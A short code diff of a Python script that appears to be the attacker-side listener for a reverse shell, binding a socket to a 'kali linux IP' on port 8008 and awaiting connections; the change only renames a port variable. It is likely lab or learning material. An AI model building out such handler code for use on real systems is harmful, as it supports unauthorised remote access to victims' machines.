@@ -4,9 +4,9 @@ if __name__ == "__main__":
     hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     hacker_IP = "192.168.64.111" # kali linux IP
-    hacker_Port = 8008
+    hacker_port = 8008
 
-    socket_address = (hacker_IP, hacker_Port)
+    socket_address = (hacker_IP, hacker_port)
     hacker_socket.bind(socket_address)
     hacker_socket.listen(5)
     print("Listening for incoming connection requests ...")
